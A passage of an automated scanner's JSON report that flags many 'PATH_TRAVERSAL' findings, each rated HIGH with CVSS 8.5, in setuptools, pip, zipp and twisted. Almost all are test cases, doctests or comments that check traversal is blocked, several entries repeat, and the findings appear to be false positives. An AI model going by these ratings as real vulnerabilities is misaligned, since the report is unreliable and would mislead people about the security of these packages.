            "context": "        assert 'setup.py' in egg_info_instance.filelist.files\n\n        with open(egg_info_instance.egg_info + \"/SOURCES.txt\", encoding=\"utf-8\") as f:\n            sources = f.read().split('\\n')\n            assert 'setup.py' in sources",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/test_bdist_wheel.py",
            "line": 686,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "../LICENSE.txt",
            "context": "                [metadata]\n                license_files =\n                  ../LICENSE.txt\n                  ../NOTICE.txt\n                \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/test_bdist_wheel.py",
            "line": 686,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "../LICENSE.txt",
            "context": "                [metadata]\n                license_files =\n                  ../LICENSE.txt\n                  ../NOTICE.txt\n                \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/test_bdist_wheel.py",
            "line": 687,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "../NOTICE.txt",
            "context": "                license_files =\n                  ../LICENSE.txt\n                  ../NOTICE.txt\n                \"\"\"\n            ),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/test_bdist_wheel.py",
            "line": 687,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "../NOTICE.txt",
            "context": "                license_files =\n                  ../LICENSE.txt\n                  ../NOTICE.txt\n                \"\"\"\n            ),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/test_bdist_wheel.py",
            "line": 695,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "msg = \"Pattern '../.*.txt' cannot contain '..'\"",
            "context": "    jaraco.path.build(files, prefix=str(tmp_path))\n    monkeypatch.chdir(tmp_path / \"python\")\n    msg = \"Pattern '../.*.txt' cannot contain '..'\"\n    with pytest.warns(SetuptoolsDeprecationWarning, match=msg):\n        bdist_wheel_cmd().run()",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/test_bdist_wheel.py",
            "line": 695,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "msg = \"Pattern '../.*.txt' cannot contain '..'\"",
            "context": "    jaraco.path.build(files, prefix=str(tmp_path))\n    monkeypatch.chdir(tmp_path / \"python\")\n    msg = \"Pattern '../.*.txt' cannot contain '..'\"\n    with pytest.warns(SetuptoolsDeprecationWarning, match=msg):\n        bdist_wheel_cmd().run()",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/test_sdist.py",
            "line": 906,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"dep_path\", (\"myheaders/dir/file.h\", \"myheaders/dir/../dir/file.h\")",
            "context": "\n    @pytest.mark.parametrize(\n        \"dep_path\", (\"myheaders/dir/file.h\", \"myheaders/dir/../dir/file.h\")\n    )\n    def test_symlink_in_extension_depends(self, monkeypatch, tmp_path, dep_path):",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/test_sdist.py",
            "line": 906,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"dep_path\", (\"myheaders/dir/file.h\", \"myheaders/dir/../dir/file.h\")",
            "context": "\n    @pytest.mark.parametrize(\n        \"dep_path\", (\"myheaders/dir/file.h\", \"myheaders/dir/../dir/file.h\")\n    )\n    def test_symlink_in_extension_depends(self, monkeypatch, tmp_path, dep_path):",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/test_sdist.py",
            "line": 954,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"dep_path\", (\"$tmp_path$/external/dir/file.h\", \"../external/dir/file.h\")",
            "context": "\n    @pytest.mark.parametrize(\n        \"dep_path\", (\"$tmp_path$/external/dir/file.h\", \"../external/dir/file.h\")\n    )\n    def test_external_path_in_extension_depends(self, monkeypatch, tmp_path, dep_path):",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/test_sdist.py",
            "line": 954,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"dep_path\", (\"$tmp_path$/external/dir/file.h\", \"../external/dir/file.h\")",
            "context": "\n    @pytest.mark.parametrize(\n        \"dep_path\", (\"$tmp_path$/external/dir/file.h\", \"../external/dir/file.h\")\n    )\n    def test_external_path_in_extension_depends(self, monkeypatch, tmp_path, dep_path):",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/command/install_scripts.py",
            "line": 65,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(target, \"w\" + mode, encoding=encoding) as f:",
            "context": "        if not self.dry_run:\n            ensure_directory(target)\n            with open(target, \"w\" + mode, encoding=encoding) as f:\n                f.write(contents)\n            chmod(target, 0o777 - mask)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_distutils/version.py",
            "line": 271,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# ../test/test_version.py) specifically to fail on things like comparing",
            "context": "#\n# In any case, I've coded the test suite for this module (see\n# ../test/test_version.py) specifically to fail on things like comparing\n# \"1.2a2\" and \"1.2\".  That's not because the *code* is doing anything\n# wrong, it's because the simple, obvious design doesn't match my",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_distutils/version.py",
            "line": 271,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# ../test/test_version.py) specifically to fail on things like comparing",
            "context": "#\n# In any case, I've coded the test suite for this module (see\n# ../test/test_version.py) specifically to fail on things like comparing\n# \"1.2a2\" and \"1.2\".  That's not because the *code* is doing anything\n# wrong, it's because the simple, obvious design doesn't match my",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/config/test_expand.py",
            "line": 57,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "expand.read_files([\"../a.txt\"])",
            "context": "        cannot_access_msg = r\"Cannot access '.*\\.\\..a\\.txt'\"\n        with pytest.raises(DistutilsOptionError, match=cannot_access_msg):\n            expand.read_files([\"../a.txt\"])\n\n        cannot_access_secrets_msg = r\"Cannot access '.*secrets\\.txt'\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/config/test_expand.py",
            "line": 57,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "expand.read_files([\"../a.txt\"])",
            "context": "        cannot_access_msg = r\"Cannot access '.*\\.\\..a\\.txt'\"\n        with pytest.raises(DistutilsOptionError, match=cannot_access_msg):\n            expand.read_files([\"../a.txt\"])\n\n        cannot_access_secrets_msg = r\"Cannot access '.*secrets\\.txt'\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/config/test_expand.py",
            "line": 61,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "expand.read_files([\"../dir_secrets/secrets.txt\"])",
            "context": "        cannot_access_secrets_msg = r\"Cannot access '.*secrets\\.txt'\"\n        with pytest.raises(DistutilsOptionError, match=cannot_access_secrets_msg):\n            expand.read_files([\"../dir_secrets/secrets.txt\"])\n\n    # Make sure the same APIs work outside cwd",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/config/test_expand.py",
            "line": 61,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "expand.read_files([\"../dir_secrets/secrets.txt\"])",
            "context": "        cannot_access_secrets_msg = r\"Cannot access '.*secrets\\.txt'\"\n        with pytest.raises(DistutilsOptionError, match=cannot_access_secrets_msg):\n            expand.read_files([\"../dir_secrets/secrets.txt\"])\n\n    # Make sure the same APIs work outside cwd",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/config/test_expand.py",
            "line": 66,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "expand.read_files([\"../a.txt\"], dir_)",
            "context": "    assert expand.read_files(list(files), dir_) == \"a\\nb\\nc\"\n    with pytest.raises(DistutilsOptionError, match=cannot_access_msg):\n        expand.read_files([\"../a.txt\"], dir_)\n\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/config/test_expand.py",
            "line": 66,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "expand.read_files([\"../a.txt\"], dir_)",
            "context": "    assert expand.read_files(list(files), dir_) == \"a\\nb\\nc\"\n    with pytest.raises(DistutilsOptionError, match=cannot_access_msg):\n        expand.read_files([\"../a.txt\"], dir_)\n\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/config/test_setupcfg.py",
            "line": 192,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "fake_env(project, '[metadata]\\nlong_description = file: ../../README\\n')",
            "context": "        project = tmpdir.join('depth1', 'depth2')\n        project.ensure(dir=True)\n        fake_env(project, '[metadata]\\nlong_description = file: ../../README\\n')\n\n        with get_dist(project, parse=False) as dist:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/config/test_setupcfg.py",
            "line": 192,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "fake_env(project, '[metadata]\\nlong_description = file: ../../README\\n')",
            "context": "        project = tmpdir.join('depth1', 'depth2')\n        project.ensure(dir=True)\n        fake_env(project, '[metadata]\\nlong_description = file: ../../README\\n')\n\n        with get_dist(project, parse=False) as dist:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/config/test_setupcfg.py",
            "line": 192,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "fake_env(project, '[metadata]\\nlong_description = file: ../../README\\n')",
            "context": "        project = tmpdir.join('depth1', 'depth2')\n        project.ensure(dir=True)\n        fake_env(project, '[metadata]\\nlong_description = file: ../../README\\n')\n\n        with get_dist(project, parse=False) as dist:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/config/test_setupcfg.py",
            "line": 192,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "fake_env(project, '[metadata]\\nlong_description = file: ../../README\\n')",
            "context": "        project = tmpdir.join('depth1', 'depth2')\n        project.ensure(dir=True)\n        fake_env(project, '[metadata]\\nlong_description = file: ../../README\\n')\n\n        with get_dist(project, parse=False) as dist:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_vendor/zipp/__init__.py",
            "line": 111,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> san('foo/.././bar.txt')",
            "context": "        >>> san('//foo.txt')\n        'foo.txt'\n        >>> san('foo/.././bar.txt')\n        'foo/bar.txt'\n        >>> san('foo../.bar.txt')",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_vendor/zipp/__init__.py",
            "line": 111,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> san('foo/.././bar.txt')",
            "context": "        >>> san('//foo.txt')\n        'foo.txt'\n        >>> san('foo/.././bar.txt')\n        'foo/bar.txt'\n        >>> san('foo../.bar.txt')",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_vendor/zipp/__init__.py",
            "line": 113,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> san('foo../.bar.txt')",
            "context": "        >>> san('foo/.././bar.txt')\n        'foo/bar.txt'\n        >>> san('foo../.bar.txt')\n        'foo../.bar.txt'\n        >>> san('\\\\foo\\\\bar.txt')",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_vendor/zipp/__init__.py",
            "line": 113,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> san('foo../.bar.txt')",
            "context": "        >>> san('foo/.././bar.txt')\n        'foo/bar.txt'\n        >>> san('foo../.bar.txt')\n        'foo../.bar.txt'\n        >>> san('\\\\foo\\\\bar.txt')",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_vendor/zipp/__init__.py",
            "line": 114,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'foo../.bar.txt'",
            "context": "        'foo/bar.txt'\n        >>> san('foo../.bar.txt')\n        'foo../.bar.txt'\n        >>> san('\\\\foo\\\\bar.txt')\n        'foo/bar.txt'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_vendor/zipp/__init__.py",
            "line": 114,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'foo../.bar.txt'",
            "context": "        'foo/bar.txt'\n        >>> san('foo../.bar.txt')\n        'foo../.bar.txt'\n        >>> san('\\\\foo\\\\bar.txt')\n        'foo/bar.txt'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_vendor/zipp/__init__.py",
            "line": 131,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> san('../..')",
            "context": "\n        Raises a ValueError if the result is empty.\n        >>> san('../..')\n        Traceback (most recent call last):\n        ...",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_vendor/zipp/__init__.py",
            "line": 131,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> san('../..')",
            "context": "\n        Raises a ValueError if the result is empty.\n        >>> san('../..')\n        Traceback (most recent call last):\n        ...",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1607,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('../foo/bar.txt')",
            "context": "        >>> bool(warned)\n        False\n        >>> vrp('../foo/bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1607,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('../foo/bar.txt')",
            "context": "        >>> bool(warned)\n        False\n        >>> vrp('../foo/bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1618,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/f../bar.txt')",
            "context": "        True\n        >>> warned.clear()\n        >>> vrp('foo/f../bar.txt')\n        >>> bool(warned)\n        False",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1618,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/f../bar.txt')",
            "context": "        True\n        >>> warned.clear()\n        >>> vrp('foo/f../bar.txt')\n        >>> bool(warned)\n        False",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/protocols/policies.py",
            "line": 604,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "logfile = self.open(self.logfilePrefix + \"-\" + str(self._counter))",
            "context": "    def buildProtocol(self, addr):\n        self._counter += 1\n        logfile = self.open(self.logfilePrefix + \"-\" + str(self._counter))\n        return self.protocol(\n            self,",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3185,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../\", []),",
            "context": "        for inp, outp in [\n            (\"..\", []),\n            (\"../\", []),\n            (\"a/..\", [\"x\"]),\n            (\"/a/..\", []),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3185,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../\", []),",
            "context": "        for inp, outp in [\n            (\"..\", []),\n            (\"../\", []),\n            (\"a/..\", [\"x\"]),\n            (\"/a/..\", []),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3189,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../\", [\"a\"]),",
            "context": "            (\"/a/..\", []),\n            (\"/a/b/..\", [\"a\"]),\n            (\"/a/b/../\", [\"a\"]),\n            (\"/a/b/../c\", [\"a\", \"c\"]),\n            (\"/a/b/../c/\", [\"a\", \"c\"]),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3189,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../\", [\"a\"]),",
            "context": "            (\"/a/..\", []),\n            (\"/a/b/..\", [\"a\"]),\n            (\"/a/b/../\", [\"a\"]),\n            (\"/a/b/../c\", [\"a\", \"c\"]),\n            (\"/a/b/../c/\", [\"a\", \"c\"]),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3190,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../c\", [\"a\", \"c\"]),",
            "context": "            (\"/a/b/..\", [\"a\"]),\n            (\"/a/b/../\", [\"a\"]),\n            (\"/a/b/../c\", [\"a\", \"c\"]),\n            (\"/a/b/../c/\", [\"a\", \"c\"]),\n            (\"/a/b/../../c\", [\"c\"]),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3190,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../c\", [\"a\", \"c\"]),",
            "context": "            (\"/a/b/..\", [\"a\"]),\n            (\"/a/b/../\", [\"a\"]),\n            (\"/a/b/../c\", [\"a\", \"c\"]),\n            (\"/a/b/../c/\", [\"a\", \"c\"]),\n            (\"/a/b/../../c\", [\"c\"]),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3191,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../c/\", [\"a\", \"c\"]),",
            "context": "            (\"/a/b/../\", [\"a\"]),\n            (\"/a/b/../c\", [\"a\", \"c\"]),\n            (\"/a/b/../c/\", [\"a\", \"c\"]),\n            (\"/a/b/../../c\", [\"c\"]),\n            (\"/a/b/../../c/\", [\"c\"]),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3191,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../c/\", [\"a\", \"c\"]),",
            "context": "            (\"/a/b/../\", [\"a\"]),\n            (\"/a/b/../c\", [\"a\", \"c\"]),\n            (\"/a/b/../c/\", [\"a\", \"c\"]),\n            (\"/a/b/../../c\", [\"c\"]),\n            (\"/a/b/../../c/\", [\"c\"]),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3192,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../../c\", [\"c\"]),",
            "context": "            (\"/a/b/../c\", [\"a\", \"c\"]),\n            (\"/a/b/../c/\", [\"a\", \"c\"]),\n            (\"/a/b/../../c\", [\"c\"]),\n            (\"/a/b/../../c/\", [\"c\"]),\n            (\"/a/b/../../c/..\", []),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3192,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../../c\", [\"c\"]),",
            "context": "            (\"/a/b/../c\", [\"a\", \"c\"]),\n            (\"/a/b/../c/\", [\"a\", \"c\"]),\n            (\"/a/b/../../c\", [\"c\"]),\n            (\"/a/b/../../c/\", [\"c\"]),\n            (\"/a/b/../../c/..\", []),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3192,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../../c\", [\"c\"]),",
            "context": "            (\"/a/b/../c\", [\"a\", \"c\"]),\n            (\"/a/b/../c/\", [\"a\", \"c\"]),\n            (\"/a/b/../../c\", [\"c\"]),\n            (\"/a/b/../../c/\", [\"c\"]),\n            (\"/a/b/../../c/..\", []),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3192,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../../c\", [\"c\"]),",
            "context": "            (\"/a/b/../c\", [\"a\", \"c\"]),\n            (\"/a/b/../c/\", [\"a\", \"c\"]),\n            (\"/a/b/../../c\", [\"c\"]),\n            (\"/a/b/../../c/\", [\"c\"]),\n            (\"/a/b/../../c/..\", []),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3193,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../../c/\", [\"c\"]),",
            "context": "            (\"/a/b/../c/\", [\"a\", \"c\"]),\n            (\"/a/b/../../c\", [\"c\"]),\n            (\"/a/b/../../c/\", [\"c\"]),\n            (\"/a/b/../../c/..\", []),\n            (\"/a/b/../../c/../\", []),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3193,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../../c/\", [\"c\"]),",
            "context": "            (\"/a/b/../c/\", [\"a\", \"c\"]),\n            (\"/a/b/../../c\", [\"c\"]),\n            (\"/a/b/../../c/\", [\"c\"]),\n            (\"/a/b/../../c/..\", []),\n            (\"/a/b/../../c/../\", []),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3193,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../../c/\", [\"c\"]),",
            "context": "            (\"/a/b/../c/\", [\"a\", \"c\"]),\n            (\"/a/b/../../c\", [\"c\"]),\n            (\"/a/b/../../c/\", [\"c\"]),\n            (\"/a/b/../../c/..\", []),\n            (\"/a/b/../../c/../\", []),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3193,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../../c/\", [\"c\"]),",
            "context": "            (\"/a/b/../c/\", [\"a\", \"c\"]),\n            (\"/a/b/../../c\", [\"c\"]),\n            (\"/a/b/../../c/\", [\"c\"]),\n            (\"/a/b/../../c/..\", []),\n            (\"/a/b/../../c/../\", []),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3194,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../../c/..\", []),",
            "context": "            (\"/a/b/../../c\", [\"c\"]),\n            (\"/a/b/../../c/\", [\"c\"]),\n            (\"/a/b/../../c/..\", []),\n            (\"/a/b/../../c/../\", []),\n        ]:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3194,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../../c/..\", []),",
            "context": "            (\"/a/b/../../c\", [\"c\"]),\n            (\"/a/b/../../c/\", [\"c\"]),\n            (\"/a/b/../../c/..\", []),\n            (\"/a/b/../../c/../\", []),\n        ]:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3194,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../../c/..\", []),",
            "context": "            (\"/a/b/../../c\", [\"c\"]),\n            (\"/a/b/../../c/\", [\"c\"]),\n            (\"/a/b/../../c/..\", []),\n            (\"/a/b/../../c/../\", []),\n        ]:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "line": 3194,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/a/b/../../c/..\", []),",
